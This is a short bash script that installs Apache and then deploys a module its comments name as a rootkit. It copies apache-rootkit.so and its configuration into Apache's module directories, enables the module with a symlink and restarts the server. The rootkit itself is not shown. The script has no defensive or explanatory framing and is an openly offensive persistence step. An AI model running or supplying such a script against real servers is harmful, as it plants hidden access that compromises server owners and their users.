#!/bin/bash

# Install dependencies
apt-get update
apt-get install -y apache2

# Disable Apache service and remove its PID file
systemctl stop apache2
rm /var/run/apache2/apache2.pid

# Copy rootkit files to Apache directory
cp apache-rootkit.so /usr/lib/apache2/modules/
cp apache-rootkit.conf /etc/apache2/mods-available/
ln -s /etc/apache2/mods-available/apache-rootkit.conf /etc/apache2/mods-enabled/

# Start Apache service
systemctl start apache2